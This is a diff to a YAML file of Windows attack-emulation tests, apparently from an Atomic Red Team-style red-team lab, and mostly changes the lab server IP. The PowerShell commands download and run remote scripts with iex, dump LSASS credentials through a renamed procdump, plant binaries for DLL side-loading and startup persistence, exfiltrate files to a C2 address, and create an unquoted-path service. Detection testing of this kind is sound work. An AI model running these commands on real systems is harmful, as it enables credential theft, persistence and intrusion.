@@ -17,7 +17,7 @@ atomic_tests:
     hta_url:
       description: URL to HTA file for execution
       type: string
-      default: http://192.168.80.138:1234/T1218.005.hta
+      default: http://192.168.80.128:1234/T1218.005.hta
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -69,7 +69,10 @@ atomic_tests:
 #   - windows
 #   executor:
 #     command: |
-#       (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/Unquoted.exe','C:\Windows\Unquoted.exe')
+#       (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/Unquoted.exe','C:\Windows\TESTLAB\Unquoted.exe')
+#       sc.exe create "Unquoted" binPath="cmd.exe /c C:\Windows\TESTLAB\Unquoted Service\calc.exe" displayName="Unquoted Service Exploit" start=auto
+#       sc.exe qc Unquoted
+#       sc.exe start Unquoted
 #     name: powershell
 #T1569
 - name: Execute a Command as a Service
@@ -116,7 +119,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/procdump.exe','C:\Windows\kb-10233.exe')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/procdump.exe','C:\Windows\kb-10233.exe')
       C:\Windows\kb-10233.exe -accepteula -ma lsass.exe C:\Users\Public\tmp\kb-10233.dmp
     name: powershell
     elevation_required: true
@@ -130,7 +133,7 @@ atomic_tests:
     destination_url:
       description: Destination URL to post encoded data.
       type: string
-      default: 192.168.80.138:9000
+      default: 192.168.80.128:8000
     filepath:
       description: The file which is being exfiltrated to the C2 Server.
       type: path
@@ -154,8 +157,8 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/libcurl.dll','C:\Windows\System32\libcurl.dll')
-      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/GUP.exe','C:\Users\nhi6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GUP.exe')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/libcurl.dll','C:\Windows\System32\libcurl.dll')
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.128:1234/GUP.exe','C:\Users\nhi6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GUP.exe')
     name: powershell
 - name: DLL Side-Loading using the Notepad++ GUP.exe binary
   description: |
@@ -186,7 +189,7 @@ atomic_tests:
   - windows
   executor:
     command: |
-      (New-Object Net.WebClient).Downloadstring('http://192.168.80.138:1234/timestomp.ps1') |iex 
+      (New-Object Net.WebClient).Downloadstring('http://192.168.80.128:1234/timestomp.ps1') |iex 
       timestomp C:\Windows\System32\libcurl.dll
     name: powershell
 
@@ -274,6 +277,6 @@ atomic_tests:
   executor:
     command: |
       copy C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs C:\Users\Public\pubprn.txt
-      (New-Object Net.WebClient).Downloadstring('http://192.168.80.138:1234/timestomp.ps1') |iex 
+      (New-Object Net.WebClient).Downloadstring('http://192.168.80.128:1234/timestomp.ps1') |iex 
       timestomp C:\Users\Public\pubprn.txt
     name: powershell
